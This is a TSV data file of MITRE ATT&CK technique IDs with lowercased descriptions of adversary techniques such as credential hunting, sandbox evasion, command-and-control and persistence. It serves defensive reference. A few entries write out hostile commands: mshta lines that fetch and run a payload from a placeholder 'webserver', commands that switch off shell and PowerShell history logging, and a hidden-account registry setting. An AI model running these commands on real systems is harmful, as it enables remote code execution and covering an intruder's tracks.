"ttp"	"description"
"t1059.008"	"adversaries may abuse scripting or built-in command line interpreters cli on network devices to execute malicious command and payloads. the cli is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. clis typically contain various permission levels required for different commands. 

scripting interpreters automate tasks and extend functionality beyond the command set included in the network os. the cli and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or ssh.

adversaries can use the network cli to change how network devices behave and operate. the cli may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.citation: cisco synful knock evolution"
"t1552.003"	"adversaries may search the bash command history on compromised systems for insecurely stored credentials. bash keeps track of the commands users type on the command-line with the ""history"" utility. once a user logs out, the history is flushed to the user’s .bash_history file. for each user, this file resides at the same location: ~/.bash_history. typically, this file keeps track of the user’s last 500 commands. users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. adversaries can abuse this by looking through the file for potential credentials. citation: external to da, the os x way"
"t1562.010"	"adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls such as logging. for example, powershell versions 5+ includes script block logging sbl which can record executed script content. however, adversaries may attempt to execute a previous version of powershell that does not support sbl with the intent to impair defenses while running malicious scripts that may have otherwise been detected.citation: crowdstrike bgh ransomware 2021citation: mandiant byol 2018citation: att_def_ps_logging

adversaries may downgrade and use less-secure versions of various features of a system, such as command and scripting interpreters or even network protocols that can be abused to enable adversary-in-the-middle.citation: praetorian tls downgrade attack 2014"
"t1559.003"	"adversaries can provide malicious content to an xpc service daemon for local code execution. macos uses xpc services for basic inter-process communication between various processes, such as between the xpc service daemon and third-party application privileged helper tools. applications can send messages to the xpc service daemon, which runs as root, using the low-level xpc service c api or the high level nsxpcconnection api in order to handle tasks that require elevated privileges such as network connections. applications are responsible for providing the protocol definition which serves as a blueprint of the xpc services. developers typically use xpc services to provide applications stability and privilege separation between the application client and the daemon.citation: creatingxpcservicescitation: designing daemons apple dev

adversaries can abuse xpc services to execute malicious content. requests for malicious execution can be passed through the application's xpc services handler.citation: cvmserver vulncitation: learn xpc exploitation this may also include identifying and abusing improper xpc client validation and/or poor sanitization of input parameters to conduct exploitation for privilege escalation."
"t1497"	"adversaries may employ various means to detect and avoid virtualization and analysis environments. this may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment vme or sandbox. if the adversary detects a vme, they may alter their malware to disengage from the victim or conceal the core functions of the implant. they may also search for vme artifacts before dropping secondary or additional payloads. adversaries may use the information learned from virtualization/sandbox evasion during automated discovery to shape follow-on behaviors.citation: deloitte environment awareness

adversaries may use several methods to accomplish virtualization/sandbox evasion such as checking for security monitoring tools e.g., sysinternals, wireshark, etc. or other system artifacts associated with analysis or virtualization. adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.citation: unit 42 pirpi july 2015

"
"t1102"	"adversaries may use an existing, legitimate external web service as a means for relaying data to/from a compromised system. popular websites and social media acting as a mechanism for c2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. using common services, such as those offered by google or twitter, makes it easier for adversaries to hide in expected noise. web service providers commonly use ssl/tls encryption, giving adversaries an added level of protection.

use of web services may also protect back-end c2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency since this infrastructure may be dynamically changed."
"t1552.001"	"adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. these can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

it is possible to extract passwords from backups or saved virtual machines through os credential dumping. citation: cg 2014 passwords may also be obtained from group policy preferences stored on the windows domain controller. citation: srd gpp

in cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.citation: unit 42 hildegard malware they may also be found as parameters to deployment commands in container logs.citation: unit 42 unsecured docker daemons in some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.citation: specter ops - cloud credential storage"
"t1568.003"	"adversaries may perform calculations on addresses returned in dns results to determine which port and ip address to use for command and control, rather than relying on a predetermined port number or the actual returned ip address. a ip and/or port number calculation can be used to bypass egress filtering on a c2 channel.citation: meyers numbered panda

one implementation of dns calculation is to take the first three octets of an ip address in a dns response and use those values to calculate the port for command and control traffic.citation: meyers numbered pandacitation: moran 2014citation: rapid7g20espionage"
"t1218.005"	"adversaries may abuse mshta.exe to proxy execution of malicious .hta files and javascript or vbscript through a trusted windows utility. there are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code citation: cylance dust storm citation: red canary hta abuse part deux citation: fireeye attacks leveraging hta citation: airbus security kovter analysis citation: fireeye fin7 april 2017 

mshta.exe is a utility that executes microsoft html applications hta files. citation: wikipedia html application htas are standalone applications that execute using the same models and technologies of internet explorer, but outside of the browser. citation: msdn html applications

files may be executed by mshta.exe through an inline script: mshta vbscript:closeexecute""getobject""""script:https://webserver/payload.sct""""""

they may also be executed directly from urls: mshta http://webserver/payload.hta

mshta.exe can be used to bypass application control solutions that do not account for its potential use. since mshta.exe executes outside of the internet explorer's security context, it also bypasses browser security settings. citation: lolbas mshta"
"t1547.015"	"adversaries may add login items to execute upon user login to gain persistence or escalate privileges. login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.citation: open login items apple login items can be added via a shared file list or service management framework.citation: adding login items shared file list login items can be set using scripting languages such as applescript, whereas the service management framework uses the api call smloginitemsetenabled.

login items installed using the service management framework leverage launchd, are not visible in the system preferences, and can only be removed by the application that created them.citation: adding login itemscitation: smloginitemsetenabled schroeder 2013 login items created using a shared file list are visible in system preferences, can hide the application when it launches, and are executed through launchservices, not launchd, to open applications, documents, or urls without using finder.citation: launch services apple developer users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.

adversaries can utilize applescript and native api calls to create a login item to spawn malicious executables.citation: elc running at startup prior to version 10.5 on macos, adversaries can add login items by using applescript to send an apple events to the “system events” process, which has an applescript dictionary for manipulating login items.citation: login items ae adversaries can use a command such as tell application “system events” to make login item at end with properties /path/to/executable.citation: startup items eclecticcitation: hexed osx.dok analysis 2019citation: add list remove login items apple script this command adds the path of the malicious executable to the login item file list located in ~/library/application support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm.citation: startup items eclectic adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.citation: objsee mac malware 2017citation: checkpoint dokcitation: objsee netwire backdoor 2019"
"t1608"	"adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. to support their operations, an adversary may need to take capabilities they developed develop capabilities or obtained obtain capabilities and stage them on infrastructure under their control. these capabilities may be staged on infrastructure that was previously purchased/rented by the adversary acquire infrastructure or was otherwise compromised by them compromise infrastructure. capabilities may also be staged on web services, such as github or pastebin, or on platform-as-a-service paas offerings that enable users to easily provision applications.citation: volexity ocean lotus november 2020citation: dragos heroku watering holecitation: malwarebytes heroku skimmerscitation: netskope gcp redirectioncitation: netskope cloud phishing

staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including but not limited to:

* staging web resources necessary to conduct drive-by compromise when a user browses to a site.citation: fireeye cfr watering hole 2012citation: gallagher 2015citation: att scanbox
* staging web resources for a link target to be used with spearphishing.citation: malwarebytes silent librarian october 2020citation: proofpoint ta407 september 2019
* uploading malware or tools to a location accessible to a victim network to enable ingress tool transfer.citation: volexity ocean lotus november 2020
* installing a previously acquired ssl/tls certificate to use to encrypt command and control traffic ex: asymmetric cryptography with web protocols.citation: digicert install ssl cert"
"t1608.005"	"adversaries may put in place resources that are referenced by a link that can be used during targeting. an adversary may rely upon a user clicking a malicious link in order to divulge information including credentials or to gain execution, as in malicious link. links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a url into a browser. prior to a phish for information as in spearphishing link or a phish to gain initial access to a system as in spearphishing link, an adversary must set up the resources for a link target for the spearphishing link. 

typically, the resources for a link target will be an html page that may include some client-side script such as javascript to decide what content to serve to the user. adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during spearphishing link.citation: malwarebytes silent librarian october 2020citation: proofpoint ta407 september 2019 adversaries may also upload malware and have the link target point to malware for download/execution by the user.

adversaries may purchase domains similar to legitimate domains ex: homoglyphs, typosquatting, different top-level domain, etc. during acquisition of infrastructure domains to help facilitate malicious link. link shortening services can also be employed. adversaries may also use free or paid accounts on platform-as-a-service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked.citation: netskope gcp redirectioncitation: netskope cloud phishingcitation: intezer app service phishing"
"t1104"	"adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. use of multiple stages may obfuscate the command and control channel to make detection more difficult.

remote access tools will call back to the first-stage command and control server for instructions. the first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. a second remote access tool rat could be uploaded at that point to redirect the host to the second-stage command and control server. the second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional rat features.

the different stages will likely be hosted separately with no overlapping infrastructure. the loader may also have backup first-stage callbacks or fallback channels in case the original first-stage communication path is discovered and blocked."
"t1480"	"adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.citation: fireeye kevin mandia guardrails values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined active directory ad domains, and local/external ip addresses.citation: fireeye outlook dec 2019

guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. this use of guardrails is distinct from typical virtualization/sandbox evasion. while use of virtualization/sandbox evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match."
"t1619"	"adversaries may enumerate objects in cloud storage infrastructure. adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  similar to file and directory discovery on a local host, after identifying available storage services i.e. cloud infrastructure discovery adversaries may access the contents/objects stored in cloud infrastructure.

cloud service providers offer apis allowing users to enumerate objects stored within cloud storage. examples include listobjectsv2 in aws citation: listobjectsv2 and list blobs in azurecitation: list blobs ."
"t1606.001"	"adversaries may forge web cookies that can be used to gain access to web applications or internet services. web applications and services hosted in cloud saas environments or on-premise servers often use session cookies to authenticate and authorize user access.

adversaries may generate these cookies in order to gain access to web resources. this differs from steal web session cookie and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.citation: pass the cookie the generation of web cookies often requires secret values, such as passwords, private keys, or other cryptographic seed values.

once forged, adversaries may use these web cookies to access resources web session cookie, which may bypass multi-factor and other authentication protection mechanisms.citation: volexity solarwindscitation: pass the cookiecitation: unit 42 mac crypto cookies january 2019"
"t1134.001"	"adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. an adversary can create a new access token that duplicates an existing token using duplicatetokenex. the token can then be used with impersonateloggedonuser to allow the calling thread to impersonate a logged on user's security context, or with setthreadtoken to assign the impersonated token to a thread.

an adversary may do this when they have a specific, existing process they want to assign the new token to. for example, this may be useful for when the target user has a non-network logon session on the system."
"t1567.001"	"adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. code repositories are often accessible via an api ex: https://api.github.com. access to these apis are often over https, which gives the adversary an additional level of protection.

exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. "
"t1205.001"	"adversaries may use port knocking to hide open ports used for persistence or command and control. to enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. after the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.

this technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.

the observation of the signal packets to trigger the communication can be conducted through different methods. one means, originally implemented by cd00r citation: hartrell cd00r 2002, is to use the libpcap libraries to sniff for the packets in question. another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs."
"t1583.006"	"adversaries may register for web services that can be used during targeting. a variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during command and control web service or exfiltration over web service. using common services, such as those offered by google or twitter, makes it easier for adversaries to hide in expected noise. by utilizing a web service, adversaries can make it difficult to physically tie back operations to them."
"t1528"	"adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.

application access tokens are used to make authorized api requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service saas.citation: auth0 - why you should always use access tokens to secure apis sept 2019 oauth is one commonly implemented framework that issues tokens to users for access to systems. adversaries who steal account api tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.

in kubernetes environments, processes running inside a container communicate with the kubernetes api server using service account tokens. if a container is compromised, an attacker may be able to steal the container’s token and thereby gain access to kubernetes api commands.citation: kubernetes service accounts

token theft can also occur through social engineering, in which case user action may be required to grant access. an application desiring access to cloud-based services or protected apis can gain entry using oauth 2.0 through a variety of authorization protocols. an example commonly-used sequence is microsoft's authorization code grant flow.citation: microsoft identity platform protocols may 2019citation: microsoft - oauth code authorization flow - june 2019 an oauth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. 
 
adversaries can leverage oauth authorization by constructing a malicious application designed to be granted access to resources with the target user's oauth token.citation: amnesty oauth phishing attacks, august 2019citation: trend micro pawn storm oauth 2017 the adversary will need to complete registration of their application with the authorization server, for example microsoft identity platform using azure portal, the visual studio ide, the command-line interface, powershell, or rest api calls.citation: microsoft - azure ad app registration - may 2019 then, they can send a spearphishing link to the target user to entice them to grant access to the application. once the oauth access token is granted, the application can gain potentially long-term access to features of the user account through application access token.citation: microsoft - azure ad identity tokens - aug 2019

application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. however, in some cases, adversaries can also steal application refresh tokenscitation: auth0 understanding refresh tokens, allowing them to obtain new access tokens without prompting the user.  

"
"t1598.002"	"adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information ex: establish accounts or compromise accounts and/or sending multiple, seemingly urgent messages.

all forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. in this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file.citation: sophos attachmentcitation: github phishery the text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. adversaries may also use information from previous reconnaissance efforts ex: search open websites/domains or search victim-owned websites to craft persuasive and believable lures."
"t1098.001"	"adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.

for example, adversaries may add credentials for service principals and applications in addition to existing legitimate credentials in azure ad.citation: microsoft solarwinds customer guidancecitation: blue cloud of deathcitation: blue cloud of death video these credentials include both x509 keys and passwords.citation: microsoft solarwinds customer guidance with sufficient permissions, there are a variety of ways to add credentials including the azure portal, azure command line interface, and azure or az powershell modules.citation: demystifying azure ad service principals

in infrastructure-as-a-service iaas environments, after gaining access through cloud accounts, adversaries may generate or import their own ssh keys using either the createkeypair or importkeypair api in aws or the gcloud compute os-login ssh-keys add command in gcp.citation: gcp ssh key add this allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.citation: expel io evil in awscitation: expel behind the scenes

adversaries may also use the createaccesskey api in aws or the gcloud iam service-accounts keys create command in gcp to add access keys to an account. if the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment i.e. cloud accounts.citation: rhino security labs aws privilege escalation"
"t1204"	"an adversary may rely upon specific actions by a user in order to gain execution. users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. these user actions will typically be observed as follow-on behavior from forms of phishing.

while user execution frequently occurs shortly after initial access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. this activity may also be seen shortly after internal spearphishing.

adversaries may also deceive users into performing actions such as enabling remote access software, allowing direct control of the system to the adversary, or downloading and executing malware for user execution. for example, tech support scams can be facilitated through phishing, vishing, or various forms of user interaction. adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or remote access software.citation: telephone attack delivery"
"t1491.001"	"an adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. this may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.citation: novetta blockbuster disturbing or offensive images may be used as a part of internal defacement in order to cause user discomfort, or to pressure compliance with accompanying messages. since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.citation: novetta blockbuster destructive malware"
"t1564.002"	"adversaries may use hidden users to hide the presence of user accounts they create or modify. administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. 

in macos, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. to prevent a user from being shown on the login screen and in system preferences, adversaries can set the userid to be under 500 and set the key value hide500users to true in the /library/preferences/com.apple.loginwindow plist file.citation: cybereason osx pirrit every user has a userid associated with it. when the hide500users key value is set to true, users with a userid under 500 do not appear on the login screen and in system preferences. using the command line, adversaries can use the dscl utility to create hidden user accounts by setting the ishidden attribute to 1. adversaries can also hide a user’s home folder by changing the chflags to hidden.citation: apple support hide a user account 

adversaries may similarly hide user accounts in windows. adversaries can set the hklm\\software\\microsoft\\windows nt\\currentversion\\winlogon\\specialaccounts\\userlist registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.citation: fireeye smokedham june 2021citation: us-cert ta18-074a

on linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. the method an adversary may use depends on which display manager the distribution is currently using. for example, on an ubuntu system using the gnome display manger gdm, accounts may be hidden from the greeter using the gsettings command ex: sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true.citation: hide gdm user accounts display managers are not anchored to specific distributions and may be changed by a user or adversary."
"t1134.003"	"adversaries may make and impersonate tokens to escalate privileges and bypass access controls. if an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the logonuser function. the function will return a copy of the new session's access token and the adversary can use setthreadtoken to assign the token to a thread."
"t1552.006"	"adversaries may attempt to find unsecured credentials in group policy preferences gpp. gpp are tools that allow administrators to create domain policies with embedded credentials. these policies allow administrators to set local accounts.citation: microsoft gpp 2016

these group policies are stored in sysvol on a domain controller. this means that any domain user can view the sysvol share and decrypt the password using the aes key that has been made public.citation: microsoft gpp key

the following tools and scripts can be used to gather and decrypt the password file from group policy preference xml files:

* metasploit’s post exploitation module: post/windows/gather/credentials/gpp
* get-gpppasswordcitation: obscuresecurity get-gpppassword
* gpprefdecrypt.py

on the sysvol share, adversaries may use the following command to enumerate potential gpp xml files: dir /s * .xml
"
"t1196"	"windows control panel items are utilities that allow users to view and adjust computer settings. control panel items are registered executable .exe or control panel .cpl files, the latter are actually renamed dynamic-link library .dll files that export a cplapplet function. citation: microsoft implementing cpl citation: trendmicro cpl malware jan 2014 control panel items can be executed directly from the command line, programmatically via an application programming interface api call, or by simply double-clicking the file. citation: microsoft implementing cpl citation: trendmicro cpl malware jan 2014 citation: trendmicro cpl malware dec 2013

for ease of use, control panel items typically include graphical menus available to users after being registered and loaded into the control panel. citation: microsoft implementing cpl

adversaries can use control panel items as execution payloads to execute arbitrary commands. malicious control panel items can be delivered via spearphishing attachment campaigns citation: trendmicro cpl malware jan 2014 citation: trendmicro cpl malware dec 2013 or executed as part of multi-stage malware. citation: palo alto reaver nov 2017 control panel items, specifically cpl files, may also bypass application and/or file extension whitelisting."
"t1048.002"	"adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. the data may also be sent to an alternate network location from the main command and control server. 

asymmetric encryption algorithms are those that use different keys on each end of the channel. also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. each end of the communication channels requires a private key only in the procession of that entity and the public key of the other entity. the public keys of each entity are exchanged before encrypted communications begin. 

network protocols that use asymmetric encryption such as https/tls/ssl often utilize symmetric encryption once keys are exchanged. adversaries may opt to use these encrypted mechanisms that are baked into a protocol. "
"t1087.004"	"adversaries may attempt to get a listing of cloud accounts. cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or saas application.

with authenticated access there are several tools that can be used to find accounts. the get-msolrolemember powershell cmdlet can be used to obtain account names given a role or permissions group in office 365.citation: microsoft msolrolemembercitation: github raindance the azure cli az cli also provides an interface to obtain user accounts with authenticated access to a domain. the command az ad user list will list all users within a domain.citation: microsoft az clicitation: black hills red teaming ms ad azure, 2018 

the aws command aws iam list-users may be used to obtain a list of users in the current account while aws iam list-roles can obtain iam roles that have a specified path prefix.citation: aws list rolescitation: aws list users in gcp, gcloud iam service-accounts list and gcloud projects get-iam-policy may be used to obtain a listing of service accounts and users in a project.citation: google cloud - iam servie accounts list api"
"t1057"	"adversaries may attempt to get information about running processes on a system. information obtained could be used to gain an understanding of common software/applications running on systems within the network. adversaries may use the information from process discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

in windows environments, adversaries could obtain details on running processes using the tasklist utility via cmd or get-process via powershell. information about processes can also be extracted from the output of native api calls such as createtoolhelp32snapshot. in mac and linux, this is accomplished with the ps command. adversaries may also opt to enumerate processes via /proc."
"t1562.003"	"adversaries may impair command history logging to hide commands they run on a compromised system. various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. 

on linux and macos, command history is tracked in a file pointed to by the environment variable histfile. when a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. the histcontrol environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. histcontrol does not exist by default on macos, but can be set by the user and will be respected.

adversaries may clear the history environment variable unset histfile or set the command history size to zero export histfilesize=0 to prevent logging of commands. additionally, histcontrol can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"". histcontrol can also be set to ignore duplicate commands by setting it to ""ignoredups"". in some linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. this means that “ ls” will not be saved, but “ls” would be saved by history. adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. 

on windows systems, the psreadline module tracks commands used in all powershell sessions and writes them to a file $env:appdata\\microsoft\\windows\\powershell\\psreadline\\consolehost_history.txt by default. adversaries may change where these logs are saved using set-psreadlineoption -historysavepath {file path}. this will cause consolehost_history.txt to stop receiving logs. additionally, it is possible to turn off logging to this file using the powershell command set-psreadlineoption -historysavestyle savenothing.citation: microsoft powershell command historycitation: sophos powershell command auditcitation: sophos powershell command history forensics

adversaries may also leverage a network device cli on network devices to disable historical command logging e.g. no logging."
"t1053.004"	"this technique is deprecated due to the inaccurate usage. the report cited did not provide technical detail as to how the malware interacted directly with launchd rather than going through known services. other system services are used to interact with launchd rather than launchd being used by itself. 

adversaries may abuse the launchd daemon to perform task scheduling for initial or recurring execution of malicious code. the launchd daemon, native to macos, is responsible for loading and maintaining services within the operating system. this process loads the parameters for each launch-on-demand system-level daemon from the property list plist files found in /system/library/launchdaemons and /library/launchdaemons citation: appledocs launch agent daemons. these launchdaemons have property list files which point to the executables that will be launched citation: methods of mac malware persistence.

an adversary may use the launchd daemon in macos environments to schedule new executables to run at system startup or on a scheduled basis for persistence. launchd can also be abused to run a process under the context of a specified account. daemons, such as launchd, run with the permissions of the root user account, and will operate regardless of which user account is logged in."
"t1546.003"	"adversaries may establish persistence and elevate privileges by executing malicious content triggered by a windows management instrumentation wmi event subscription. wmi can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime.citation: mandiant m-trends 2015

adversaries may use the capabilities of wmi to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.citation: fireeye wmi sans 2015citation: fireeye wmi 2015 adversaries may also compile wmi scripts into windows management object mof files .mof extension that can be used to create a malicious subscription.citation: dell wmi persistencecitation: microsoft mof may 2018

wmi subscription execution is proxied by the wmi provider host process wmiprvse.exe and thus may result in elevated system privileges."
"t1596.004"	"adversaries may search content delivery network cdn data about victims that can be used during targeting. cdns allow an organization to host content from a distributed, load balanced array of servers. cdns may also allow organizations to customize content delivery based on the requestor’s geographical region.

adversaries may search cdn data to gather actionable information. threat actors can use online resources and lookup tools to harvest information about content servers within a cdn. adversaries may also seek and target cdn misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms ex: login portals as the content hosted on the organization’s website.citation: digitalshadows cdn information from these sources may reveal opportunities for other forms of reconnaissance ex: active scanning or search open websites/domains, establishing operational resources ex: acquire infrastructure or compromise infrastructure, and/or initial access ex: drive-by compromise."
"t1497.002"	"adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. this may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment vme or sandbox. if the adversary detects a vme, they may alter their malware to disengage from the victim or conceal the core functions of the implant. they may also search for vme artifacts before dropping secondary or additional payloads. adversaries may use the information learned from virtualization/sandbox evasion during automated discovery to shape follow-on behaviors.citation: deloitte environment awareness

adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks citation: sans virtual jan 2016 , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro citation: unit 42 sofacy nov 2018 or waiting for a user to double click on an embedded image to activate.citation: fireeye fin7 april 2017 "
"t1141"	"when programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task ex: bypass user account control.

adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.citation: osx malware exploits mackeeper this type of prompt can be used to collect credentials via various languages such as applescriptcitation: logrhythm do you trust oct 2014citation: osx keydnap malware and powershellcitation: logrhythm do you trust oct 2014citation: enigma phishing for credentials jan 2015."
"t1585.003"	"adversaries may create accounts with cloud providers that can be used during targeting. adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as dropbox, microsoft onedrive, or aws s3 buckets for exfiltration to cloud storage or to upload tools. cloud accounts can also be used in the acquisition of infrastructure, such as virtual private servers or serverless infrastructure. establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.citation: awake security c2 cloud

creating cloud accounts may also require adversaries to establish email accounts to register with the cloud provider. "
